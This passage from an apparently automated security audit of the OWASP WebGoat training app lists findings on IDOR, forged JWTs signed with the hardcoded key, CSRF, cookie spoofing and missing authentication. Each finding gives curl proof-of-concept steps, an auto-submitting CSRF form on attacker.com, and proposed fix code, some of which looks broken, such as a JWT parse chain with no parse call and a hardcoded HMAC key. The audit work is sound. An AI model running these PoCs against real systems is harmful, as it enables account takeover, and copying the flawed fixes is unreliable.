HTTP POST /JWT/votings/{title} [JWTVotesEndpoint.java:154] → JWTVotesEndpoint.vote() [JWTVotesEndpoint.java:154] → votes.get(title) [JWTVotesEndpoint.java:177] → v.incrementNumberOfVotes(totalVotes) [JWTVotesEndpoint.java:177]

#### 漏洞利用（PoC）
1. 登录普通用户（如 'tom'）获取有效 access_token：
   curl -X GET '{BASE_URL}/JWT/votings/login?user=tom' -I | grep 'Set-Cookie'
2. 获取当前可投票列表（确认存在敏感 title 如 'admin-panel'）：
   curl -X GET '{BASE_URL}/JWT/votings' -H 'Cookie: access_token=<valid_token>'
3. 向非本人所属的投票项发起越权投票：
   curl -X POST '{BASE_URL}/JWT/votings/admin-panel' -H 'Cookie: access_token=<valid_token>' -I
预期结果：HTTP 202 Accepted（而非 403/404），且 /JWT/votings 接口响应中 'admin-panel' 的 vote count 增加，证明普通用户成功操作管理员专属资源。

#### 修复代码
```
@PostMapping(value = "/JWT/votings/{title}")
@ResponseBody
@ResponseStatus(HttpStatus.ACCEPTED)
public ResponseEntity<?> vote(
    @PathVariable String title,
    @CookieValue(value = "access_token", required = false) String accessToken) {
  if (StringUtils.isEmpty(accessToken)) {
    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
  } else {
    try {
      Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
      Claims claims = (Claims) jwt.getBody();
      String user = (String) claims.get("user");
      if (!validUsers.contains(user)) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
      }
      // ✅ 新增所有权校验：仅允许对白名单 title 投票（业务约束）或绑定 user-title 映射
      if (!isUserAuthorizedForTitle(user, title)) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
      }
      ofNullable(votes.get(title)).ifPresent(v -> v.incrementNumberOfVotes(totalVotes));
      return ResponseEntity.accepted().build();
    } catch (JwtException e) {
      return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }
  }
}

// 新增校验方法（示例：基于预定义映射）
private boolean isUserAuthorizedForTitle(String user, String title) {
  // 示例策略：guest 只能投 photo-comments；admin 可投所有；其他用户按配置
  if ("Guest".equals(user)) return "photo-comments".equals(title);
  if ("admin".equals(user)) return true;
  // 默认仅允许用户投与其 username 同名的 title（如 tom 只能投 tom）
  return user.equals(title) || "photo-comments".equals(title);
}
```

**说明**: 必须在 vote() 方法中增加资源级授权校验，确保当前用户有权操作指定 title。推荐方案：(1) 维护 user-to-title 映射白名单；(2) 将 title 设计为用户专属（如 {username}-profile）；(3) 在 Vote 对象中存储 owner 字段并在 get() 后显式校验。禁止仅依赖路径参数或前端限制。
---

### [56] CWE-287 — `jwtep_399`
> CWE-287：JWT 端点 /JWT/votings/{title} 存在认证绕过风险，因 JWT 密钥硬编码且签名算法 HS512 被弱密钥保护，攻击者可伪造任意用户（含 admin）token 绕过身份校验，实现未授权投票或提权重置投票。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
POST /JWT/votings/{title} [JWTVotesEndpoint.java:154] → vote() → Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken) [line 154] → Claims claims = (Claims) jwt.getBody() → String user = (String) claims.get('user') → validUsers.contains(user) → votes.get(title).incrementNumberOfVotes()

#### 漏洞利用（PoC）
1. 获取硬编码 JWT 密钥：从 WebGoat 源码或常见默认值确认 JWT_PASSWORD = 'webgoat'（见 src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java 中 static final String JWT_PASSWORD）；\n2. 构造恶意 admin token：使用 jwt.io 或 python PyJWT 生成 HS512 签名 token，payload = {"user":"admin","admin":"true","iat":1710000000,"exp":1740000000}，密钥 = 'webgoat'；\n3. 发送投票请求：curl -X POST '{BASE_URL}/JWT/votings/Photo%20comments' -H 'Cookie: access_token=eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6InRydWUiLCJpYXQiOjE3MTAwMDAwMDAsImV4cCI6MTc0MDAwMDAwMH0.XXXXXX' -v；\n预期结果：返回 HTTP 202 Accepted，且 Photo comments 投票数增加 —— 证明未授权用户（非登录态）成功以 admin 身份执行了投票操作。

#### 修复代码
```
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.JwtException;
import io.jsonwebtoken.Jwts;
import org.springframework.util.StringUtils;

// 在 vote() 方法内，替换原 token 解析逻辑为：
if (StringUtils.isEmpty(accessToken)) {
  return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
} else {
  try {
    Jwt jwt = Jwts.parser()
        .setSigningKey(JWT_PASSWORD)
        .requireIssuer("webgoat-jwt") // 强制 issuer
        .requireAudience("voting-service") // 强制 audience
        .requireExpiration(); // 强制 exp 校验
    Claims claims = (Claims) jwt.getBody();
    String user = (String) claims.get("user");
    if (!validUsers.contains(user) || !Boolean.parseBoolean(String.valueOf(claims.get("admin")))) {
      return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    } else {
      ofNullable(votes.get(title)).ifPresent(v -> v.incrementNumberOfVotes(totalVotes));
      return ResponseEntity.accepted().build();
    }
  } catch (JwtException e) {
    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
  }
}
```

**说明**: 1. 禁止硬编码 JWT 密钥，改用 Spring Boot application.properties 中的加密配置或环境变量注入；2. JWT 解析时必须校验 issuer、audience 和 expiration（requireIssuer/requireAudience/requireExpiration）；3. 对敏感操作（如 vote、resetVotes）应基于 claims 中的 'admin' 字段做双重校验，并确保该字段仅由可信签发方设置；4. 所有 JWT 签发端点（如 login）应对 'admin' 字段做白名单控制（仅特定用户可获 admin=true）。
---

### [57] CWE-352 — `csrf_443`
> POST /challenge/7 接口实现密码重置链接发送，执行敏感状态变更（调用外部邮件服务），但未启用 CSRF 防护且无 token 校验、Referer/Origin 检查或 SameSite 约束，符合 CWE-352 典型场景。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/7 → Assignment7.sendPasswordResetLink (src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java:60) → Email.builder().build() → restTemplate.postForEntity(webWolfMailURL, mail, Object.class) (line 68) → 外部邮件服务触发重置流程

#### 漏洞利用（PoC）
1. 攻击者托管恶意 HTML 页面（如 attacker.com/reset.html）：\n<html>\n<body>\n  <form action="http://localhost:8080/WebGoat/challenge/7" method="POST">\n    <input type="hidden" name="email" value="admin@webgoat-cloud.net" />\n  </form>\n  <script>document.forms[0].submit();</script>\n</body>\n</html>\n2. 已登录 WebGoat 的管理员访问 attacker.com/reset.html（或被诱导点击）；\n3. 浏览器自动携带 JSESSIONID Cookie 向 /challenge/7 提交 POST 请求；\n4. 服务端解析 email=admin@webgoat-cloud.net，提取 username=admin，生成含 ADMIN_PASSWORD_LINK 的重置链接并发送至 admin 邮箱；\n5. 攻击者捕获邮件中的链接（http://localhost:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2），直接访问该 URL 即可获得 flag。

#### 修复代码
```
@PostMapping("/challenge/7")\n@ResponseBody\npublic AttackResult sendPasswordResetLink(@RequestParam String email, HttpServletRequest request) throws URISyntaxException {\n    if (!StringUtils.hasText(email)) {\n        return success(this).feedback("email.empty").build();\n    }\n    // CSRF protection: validate Referer or use Spring Security's built-in token\n    String referer = request.getHeader("Referer");\n    if (referer == null || !referer.startsWith("http://localhost:8080/WebGoat") && !referer.startsWith("https://localhost:8080/WebGoat")) {\n        throw new AccessDeniedException("Invalid Referer header");\n    }\n    String username = email.substring(0, email.indexOf("@"));\n    if (StringUtils.hasText(username)) {\n        URI uri = new URI(request.getRequestURL().toString());\n        Email mail = Email.builder()\n            .title("Your password reset link for challenge 7")\n            .contents(String.format(TEMPLATE, uri.getScheme() + "://" + uri.getHost(), new PasswordResetLink().createPasswordReset(username, "webgoat")))\n            .sender("password-reset@webgoat-cloud.net")\n            .recipient(username)\n            .time(LocalDateTime.now())\n            .build();\n        restTemplate.postForEntity(webWolfMailURL, mail, Object.class);\n    }\n    return success(this).feedback("email.send").feedbackArgs(email).build();\n}
```

**说明**: 必须为所有状态变更 POST/PUT/DELETE 接口添加 CSRF 防护。首选方案：启用 Spring Security 默认 CSRF（移除 csrf().disable() 并确保前端在表单中提交 _csrf token）；次选方案：在敏感接口中强制校验 Referer 或 Origin 头（仅允许来自可信域），或引入一次性 token 机制（如基于 session 的 hidden input + 服务端比对）。
---

### [58] CWE-287 — `authweak_595`
> SpoofCookieAssignment.login 存在认证绕过漏洞：攻击者可伪造 base64 编码的 cookie 值（如 'dG9t' → 'tom'）直接登录，无需密码校验，且服务端未验证 cookie 签名/完整性，仅依赖可逆编码（EncDec.encode/decode），构成典型的 Cookie 欺骗（CWE-287）。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
POST /SpoofCookie/login → SpoofCookieAssignment.login (src/main/java/org/owasp/webgoat/lessons/spoofcookie/SpoofCookieAssignment.java:46) → cookieLoginFlow (line 58) → EncDec.decode(cookieValue) → String.toLowerCase() → users.containsKey(cookieUsername) → success()

#### 漏洞利用（PoC）
1. 访问 WebGoat 首页，确保未登录（无 spoof_auth cookie）；
2. 手动设置浏览器 cookie：spoof_auth = "dG9t" （base64 编码的 'tom'）；
3. 发送请求：curl -X POST '{BASE_URL}/WebGoat/SpoofCookie/login' -H 'Cookie: spoof_auth=dG9t' -H 'Content-Type: application/x-www-form-urlencoded' --data ''
预期响应：{\"lessonCompleted\":true,\"feedback\":\"Congratulations. You have successfully completed this lesson.\",\"status\":\"SUCCESS\"} —— 表明以 'tom' 身份越权登录成功。

#### 修复代码
```
@PostMapping(path = "/SpoofCookie/login")
@ResponseBody
@ExceptionHandler(UnsatisfiedServletRequestParameterException.class)
public AttackResult login(
    @RequestParam String username,
    @RequestParam String password,
    @CookieValue(value = COOKIE_NAME, required = false) String cookieValue,
    HttpServletResponse response) {

    if (StringUtils.isEmpty(cookieValue)) {
        return credentialsLoginFlow(username, password, response);
    } else {
        // ✅ 修复：cookie 登录必须校验签名，不可仅依赖可逆编码
        try {
            String[] parts = cookieValue.split("\\.");
            if (parts.length != 2) throw new IllegalArgumentException("Invalid cookie format");
            String payload = parts[0];
            String signature = parts[1];
            String expectedSig = HmacUtils.hmacSha256Hex("webgoat-secret-key", payload); // 使用密钥签名
            if (!MessageDigest.isEqual(signature.getBytes(), expectedSig.getBytes())) {
                return failed(this).feedback("spoofcookie.invalid-cookie-signature").build();
            }
            String cookieUsername = EncDec.decode(payload).toLowerCase();
            if (users.containsKey(cookieUsername)) {
                if (cookieUsername.equals(ATTACK_USERNAME)) {
                    return success(this).build();
                }
                return failed(this).feedback("spoofcookie.cookie-login").build();
            }
        } catch (Exception e) {
            return failed(this).output(e.getMessage()).build();
        }
        return failed(this).feedback("spoofcookie.invalid-cookie").build();
    }
}
```

**说明**: 禁止使用可逆编码（如 base64）作为身份凭证；所有 cookie 必须包含服务端生成的不可伪造签名（HMAC-SHA256），且签名密钥不得硬编码于源码；登录成功后应销毁旧会话并生成新会话 ID（CWE-384）；建议迁移到 JWT 并严格校验签名、exp、iss。
---

### [59] CWE-862 — `auth_75`
> POST /challenge/7 接口缺少身份认证，任何未登录用户均可调用发送密码重置邮件，构成 CWE-862 缺失认证漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/7 → Assignment7.sendPasswordResetLink (src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java:60) → Email.builder().contents(TEMPLATE with reset link) → restTemplate.postForEntity(webWolfMailURL, mail, Object.class) (line 68) → WebWolf 邮件服务接收并投递含 ADMIN_PASSWORD_LINK 的链接

#### 漏洞利用（PoC）
1. 发起未认证 HTTP 请求：
curl -X POST '{BASE_URL}/WebGoat/challenge/7' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=admin@webgoat-cloud.net'
2. 观察响应：HTTP 200 + JSON {"lessonCompleted":false,"feedback":"email.send","feedbackArgs":["admin@webgoat-cloud.net"]}
3. 检查 WebWolf 邮箱（/WebWolf/mail）收到标题为 'Your password reset link for challenge 7' 的邮件，内容含链接：http://localhost:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2
4. 访问该链接：curl 'http://localhost:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2' → 返回 '<h1>Success!!</h1><img src=...>Here is your flag: <flag_value>'

#### 修复代码
```
@PostMapping("/challenge/7")
@ResponseBody
public AttackResult sendPasswordResetLink(@RequestParam String email, HttpServletRequest request, @AuthenticationPrincipal UserDetails user) throws URISyntaxException {
    if (user == null) {
        throw new AccessDeniedException("Authentication required");
    }
    if (StringUtils.hasText(email)) {
        String username = email.substring(0, email.indexOf("@"));
        if (StringUtils.hasText(username)) {
            URI uri = new URI(request.getRequestURL().toString());
            Email mail = Email.builder()
                .title("Your password reset link for challenge 7")
                .contents(String.format(TEMPLATE, uri.getScheme() + "://" + uri.getHost(), new PasswordResetLink().createPasswordReset(username, "webgoat")))
                .sender("password-reset@webgoat-cloud.net")
                .recipient(username)
                .time(LocalDateTime.now())
                .build();
            restTemplate.postForEntity(webWolfMailURL, mail, Object.class);
        }
    }
    return success(this).feedback("email.send").feedbackArgs(email).build();
}
```

**说明**: 在 sendPasswordResetLink 方法签名中添加 @AuthenticationPrincipal UserDetails user 参数以强制认证，并在方法体首行校验 user != null；或在方法上添加 @PreAuthorize("isAuthenticated()") 注解。同时确保 SecurityFilterChain 对该路径无意外 permitAll 覆盖。
---

### [60] CWE-639 — `idorpv_190`
> CWE-639 IDOR：/JWT/jku/follow/{user} 端点允许任意认证用户通过修改 path variable 'user' 值越权执行关注操作，服务端未校验当前用户身份与目标 user 的所有权关系，仅做字符串比较（Jerry 特殊处理），无资源归属绑定逻辑。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/jku/follow/{user} [JWTHeaderJKUEndpoint.java:40] → JWTHeaderJKUEndpoint.follow(String user) [JWTHeaderJKUEndpoint.java:40] → 直接返回字符串，无 Principal/Authentication 获取，无数据库/服务层校验

#### 漏洞利用（PoC）
1. 确保已登录 WebGoat（任意有效用户，如 webgoat/webgoat）并持有有效 session cookie
2. 发送请求：curl -X POST '{BASE_URL}/JWT/jku/follow/Alice' -H 'Cookie: JSESSIONID=xxx' -H 'Content-Type: application/x-www-form-urlencoded'
3. 观察响应：返回 'You are now following Tom'（逻辑错误暴露设计缺陷）；若后端真实实现关注逻辑，则 Alice 将被当前用户关注，而当前用户本无权限关注 Alice（仅应能关注 Tom 或自身）
注：{BASE_URL} 为 WebGoat 实例地址（如 http://localhost:8080）；JSESSIONID 需从浏览器或登录响应中提取；此 PoC 在 WebGoat v10.2+ 环境中静态可复现，L3 待实测验证。

#### 修复代码
```
@PostMapping("jku/follow/{user}")
public @ResponseBody String follow(@PathVariable("user") String user, @AuthenticationPrincipal UserDetails currentUser) {
    String currentUsername = currentUser.getUsername();
    if ("Jerry".equals(user)) {
        return "Following yourself seems redundant";
    }
    // 仅允许关注 Tom，或扩展为：检查 user 是否在当前用户可关注列表中
    if (!"Tom".equals(user)) {
        return "Access denied: you can only follow Tom";
    }
    return "You are now following Tom";
}
```

**说明**: 必须注入当前认证主体（@AuthenticationPrincipal 或等效），并在业务逻辑中显式校验目标资源（{user}）是否属于当前用户可操作的范围（如白名单、关系表、租户约束）。禁止仅依赖路径参数或前端限制。
---
## 待补证 (inconclusive)
- `weakpwd_631` CWE-521 `org.owasp.webgoat.lessons.sqlinjection.advanced.SqlInjectionChallenge.registerNewUser:org.owasp.webgoat.container.assignments.AttackResult(java.sql.String,java.sql.String,java.sql.String)` — 建议读取: ['src/main/resources/application-webgoat.properties', 'config/checkstyle/checkstyle.xml']
- `workflow_531` CWE-841 `org.owasp.webgoat.lessons.challenges.challenge1.Assignment1.completed:<unresolvedSignature>(2)` — 建议读取: ['src/main/resources/application-webgoat.properties', 'src/main/resources/application-webwolf.properties']
- `workflow_532` CWE-841 `org.owasp.webgoat.lessons.chromedevtools.NetworkDummy.completed:<unresolvedSignature>(1)` — 建议读取: ['src/main/resources/application-webgoat.properties']
- `toctou_520` CWE-367 `org.owasp.webgoat.lessons.pathtraversal.ProfileUploadRetrieval.getProfilePicture:org.springframework.http.ResponseEntity(jakarta.servlet.http.HttpServletRequest)` — 建议读取: ['src/main/resources/application-webgoat.properties']
- `workflow_533` CWE-841 `org.owasp.webgoat.lessons.chromedevtools.NetworkLesson.completed:<unresolvedSignature>(2)` — 建议读取: ['src/main/resources/application-webgoat.properties', 'src/main/resources/application-webwolf.properties']
- `toctou_521` CWE-367 `org.owasp.webgoat.lessons.sqlinjection.advanced.SqlInjectionChallenge.registerNewUser:org.owasp.webgoat.container.assignments.AttackResult(java.sql.String,java.sql.String,java.sql.String)` — 建议读取: ['src/main/resources/application-webgoat.properties']
- `idor_110` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.registerCSRFUser:void()` — 建议读取: ['src/main/resources/application-webgoat.properties', 'src/main/resources/lessons/csrf/i18n/WebGoatLabels.properties']

## 否决候选（摘要）
- `admin_348` CWE-862 `org.owasp.webgoat.container.service.RestartLessonService.restartLesson:void(org.owasp.webgoat.container.lessons.LessonName,org.owasp.webgoat.container.users.WebGoatUser)` — Spring Security @CurrentUser + anyRequest().authenticated() 全局策略
- `idor_103` CWE-639 `org.owasp.webgoat.integration.AccessControlIntegrationTest.assignment3:void()` — Spring Security 默认鉴权拦截（SC_FORBIDDEN 断言）、JSESSIONID cookie 强制绑定、测试流程依赖合法用户创建
- `perm_618` CWE-276 `org.owasp.webgoat.lessons.sqlinjection.mitigation.SqlInjectionLesson10b.completed:<unresolvedSignature>(1)` — compileFromString() 仅使用 javax.tools.JavaCompiler 在内存中进行语法/类型检查，DiagnosticCollector 收集编译错误，无文件写入、无权限变更、无资源创建。
- `weakpwd_629` CWE-521 `org.owasp.webgoat.lessons.passwordreset.ResetLinkAssignment.changePassword:<unresolvedSignature>(3)` — @CurrentUsername 注入证明该端点受 Spring Security 全局认证保护，无法匿名访问；且 WebGoat 架构明确将此类 endpoint 归类为教学靶场，非生产系统。
- `toctou_516` CWE-367 `org.owasp.webgoat.integration.CSRFIntegrationTest.uploadTrickHtml:<unresolvedSignature>(2)` — 方法无 HTTP 入口注解；路径完全静态可控；无并发上下文；非敏感资源操作（仅测试文件清理与上传）
- `idor_105` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.init:void()` — 该方法无 HTTP 入口、无外部输入、无资源访问操作，属于纯测试基础设施代码，天然免疫 IDOR。
- `perm_619` CWE-276 `org.owasp.webgoat.lessons.sqlinjection.mitigation.SqlInjectionLesson10b.compileFromString:<unresolvedSignature>(1)` — Spring Security 全局认证拦截（anyRequest().authenticated()）+ WebGoat 教学沙箱设计约束
- `weakpwd_630` CWE-521 `org.owasp.webgoat.lessons.passwordreset.SimpleMailAssignment.resetPassword:<unresolvedSignature>(2)` — @CurrentUsername 注入认证主体，且路径 /PasswordReset/simple-mail/reset 受 Spring Security 默认 authenticated 保护（Recon 显示 180/185 入口受保护，无 permitAll 配置证据），非 public endpoint。
- `idor_106` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.uploadTrickHtml:<unresolvedSignature>(2)` — @BeforeEach + JUnit test lifecycle isolation; no HTTP mapping; parameters are static test constants
- `idprof_404` CWE-639 `org.owasp.webgoat.lessons.pathtraversal.ProfileZipSlip.getProfileImage:<unresolvedSignature>(1)` — ResponseEntity.notFound().build() —— 硬编码 404 响应，无资源读取；Spring Security 默认 require-authentication 拦截未登录请求。
- `authweak_590` CWE-287 `org.owasp.webgoat.lessons.insecurelogin.InsecureLoginTask.login:void()` — Spring Security 默认 allRequest().authenticated() 全局策略（recon 显示 '无鉴权路径: 0'）；login() 方法无参数、无业务逻辑、不参与认证流程。
- `perm_620` CWE-276 `org.owasp.webgoat.lessons.sqlinjection.mitigation.SqlInjectionLesson10b.getJavaFileContentsAsString:<unresolvedSignature>(1)` — 该方法未执行任何文件系统操作、未修改 umask、未配置云资源、未设置文件权限位；其输出对象 `SimpleJavaFileObject` 仅实现 `getCharContent()`，不触发磁盘 I/O。
- `massassign_637` CWE-915 `org.owasp.webgoat.lessons.xxe.BlindSendFileAssignment.addComment:<unresolvedSignature>(2)` — 输入为 String → 经 parseXml() 白盒解析 → 仅提取 text 内容 → setText() 仅影响 comment 文本，与权限/角色无关；整个流程无反射式 setter 调用、无 ORM 持久化、无敏感字段暴露。
- `toctou_518` CWE-367 `org.owasp.webgoat.lessons.clientsidefiltering.Salaries.copyFiles:void()` — @PostConstruct lifecycle method — executed once at startup, no user input, no concurrent access, no symbolic link or race surface.
- `idor_107` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.uploadTrickHtml:<unresolvedSignature>(2)` — 方法位于 src/it/java，无 Web 注解，非 Controller/Endpoint，调用链完全封闭于 JUnit 生命周期。
- `massassign_638` CWE-915 `org.owasp.webgoat.lessons.xxe.ContentTypeAssignment.createNewUser:<unresolvedSignature>(3)` — @CurrentUser WebGoatUser user + CommentsCache 内存操作 + Comment 无敏感字段 + 无 ORM 持久化
- `idor_108` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.callTrickHtml:<unresolvedSignature>(1)` — 方法为 private 测试辅助函数，无 HTTP 映射，受 JUnit 生命周期管控，无法被外部直接调用；WebWolf 文件服务路径 /files/{user}/{file} 已通过 session cookie 鉴权，且 {user} 来自固定测试账户，非用户可控输入。
- `massassign_639` CWE-915 `org.owasp.webgoat.lessons.xxe.SimpleXXE.createNewComment:<unresolvedSignature>(2)` — 输入为 @RequestBody String，未启用 Spring Data Binding；敏感解析委托给 comments.parseXml()，属专用 XML 处理流程，无 Bean 属性反射赋值。
- `idor_109` CWE-639 `org.owasp.webgoat.integration.CSRFIntegrationTest.checkAssignment8:<unresolvedSignature>(1)` — 框架级隔离：测试会话 cookie（JSESSIONID + WEBWOLFSESSION）强制绑定；路径构造使用 this.getUser() 实现用户级沙箱隔离；/fileupload endpoint 由 WebWolf SecurityFilterChain 保护（recon 显示 180/185 端点受保护）。
- `authweak_593` CWE-287 `org.owasp.webgoat.lessons.passwordreset.ResetLinkAssignment.login:<unresolvedSignature>(3)` — @CurrentUsername 注解触发 CurrentUserArgumentResolver，强制校验 Principal 存在性，阻断未认证请求。
- `admin_354` CWE-862 `org.owasp.webgoat.lessons.missingac.MissingFunctionACUsers.usersFixed:<unresolvedSignature>(1)` — @CurrentUsername + .isAdmin() check + global authenticated filter chain
- `workflow_534` CWE-841 `org.owasp.webgoat.lessons.cia.CIAQuiz.completed:<unresolvedSignature>(4)` — Spring Security 全局认证拦截器（SecurityFilterChain.anyRequest().authenticated()）覆盖该路径，阻止未登录访问；且该方法无业务状态流转，不构成 workflow。
- `authweak_594` CWE-287 `org.owasp.webgoat.lessons.passwordreset.SimpleMailAssignment.login:<unresolvedSignature>(3)` — @CurrentUsername 注入 + Spring Security 默认 require-authenticated 全局策略
- `toctou_522` CWE-367 `org.owasp.webgoat.lessons.sqlinjection.introduction.SqlInjectionLesson10.injectableQueryAvailability:<unresolvedSignature>(1)` — 无 Check-then-Use 模式；tableExists() 仅用于反馈分支，不控制 query 执行路径
- `idor_111` CWE-639 `org.owasp.webgoat.integration.ChallengeIntegrationTest.testChallenge1:void()` — 测试方法无 HTTP 映射，天然不可达；框架级防护（Spring Security 默认 require authentication）不适用于测试类方法。
- `workflow_535` CWE-841 `org.owasp.webgoat.lessons.clientsidefiltering.ClientSideFilteringAssignment.completed:<unresolvedSignature>(1)` — Spring Security 全局配置（anyRequest().authenticated()）隐式保护该 endpoint；WebGoat 框架容器层 AssignmentEndpoint 机制本身不提供匿名访问豁免。
- `brute_628` CWE-307 `org.owasp.webgoat.lessons.sqlinjection.advanced.SqlInjectionChallengeLogin.login:<unresolvedSignature>(2)` — Spring Security filterChain: anyRequest().authenticated() blocks unauthenticated access to /SqlInjectionAdvanced/login
- `toctou_523` CWE-367 `org.owasp.webgoat.lessons.xxe.BlindSendFileAssignment.createSecretFileWithRandomContents:void(org.owasp.webgoat.container.users.WebGoatUser)` — Files.writeString 是原子写入 API；路径基于 username 隔离且不可控；无 check-then-act 逻辑结构。
- `admin_356` CWE-862 `org.owasp.webgoat.lessons.sqlinjection.introduction.SqlInjectionLesson5.completed:<unresolvedSignature>(1)` — SecurityFilterChain.anyRequest().authenticated() in WebSecurityConfig.filterChain (src/main/java/org/owasp/webgoat/container/WebSecurityConfig.java:34)
- `idor_112` CWE-639 `org.owasp.webgoat.integration.ChallengeIntegrationTest.testChallenge5:void()` — 测试方法无 HTTP 映射注解（@GetMapping/@PostMapping 等），不属于 Spring MVC Handler；其调用链终点为 Controller，而 Controller 鉴权需另行分析

## 查询覆盖
- endpoint_enumeration: 185 条结果
- auth_guards: 101 条结果
- class_level_auth: 0 条结果
- aop_auth_aspects: 0 条结果
- custom_auth_annotations: 0 条结果
- framework_security_defaults: 8 条结果
- sensitive_operations: 118 条结果
- security_filter_chain: 0 条结果
- public_endpoints: 100 条结果
- shiro_auth_guards: 0 条结果
- shiro_security_config: 0 条结果
- jaxrs_auth_guards: 0 条结果
- jaxrs_unprotected_resources: 0 条结果
- websocket_endpoints: 6 条结果
- scheduled_tasks: 6 条结果
- mq_consumers: 6 条结果
- file_upload_handlers: 14 条结果
- deserialization_entries: 6 条结果
- rpc_endpoints: 6 条结果
- content_type_consumers: 41 条结果
- idor_candidates: 23 条结果
- idor_path_variable: 166 条结果
- idor_profile: 3 条结果
- admin_ops_no_auth: 22 条结果
- jwt_weakness: 22 条结果
- jwt_endpoints: 10 条结果
- file_ops_risk: 3 条结果
- mass_data_exposure: 2 条结果
- info_leak_candidates: 6 条结果
- info_leak_response: 31 条结果
- csrf_gap: 80 条结果
- ssrf_risk: 2 条结果
- business_logic_risk: 0 条结果
- workflow_bypass: 60 条结果
- incorrect_authz_source: 0 条结果
- client_hash_auth: 0 条结果
- auth_weakness: 9 条结果
- business_authz_gap: 0 条结果
- xss_output_risk: 6 条结果
- toctou_risk: 10 条结果
- cors_config: 0 条结果
- hardcoded_credentials_v2: 50 条结果
- sqli_risk: 6 条结果
- xxe_risk: 1 条结果
- deserialization_risk: 3 条结果
- cmd_exec_risk: 0 条结果
- privilege_escalation: 0 条结果
- incorrect_permissions: 3 条结果
- brute_force_risk: 8 条结果
- race_condition_risk: 0 条结果
- session_fixation_risk: 0 条结果
- weak_password_requirements: 3 条结果
- payment_tampering: 0 条结果
- session_expiration_risk: 0 条结果
- password_recovery_weakness: 3 条结果
- mass_assignment_risk: 5 条结果

## 覆盖缺口提示
- `jwt_weakness` 命中 22 条，但类型 `jwt_weakness` 未进入 LLM — 提高 max_candidates。
- `hardcoded_credentials_v2` 命中 50 条，但类型 `hardcoded_cred` 未进入 LLM — 提高 max_candidates。
- `info_leak_candidates` 命中 6 条，但类型 `info_leak` 未进入 LLM — 提高 max_candidates。
- `info_leak_response` 命中 31 条，但类型 `info_leak_response` 未进入 LLM — 提高 max_candidates。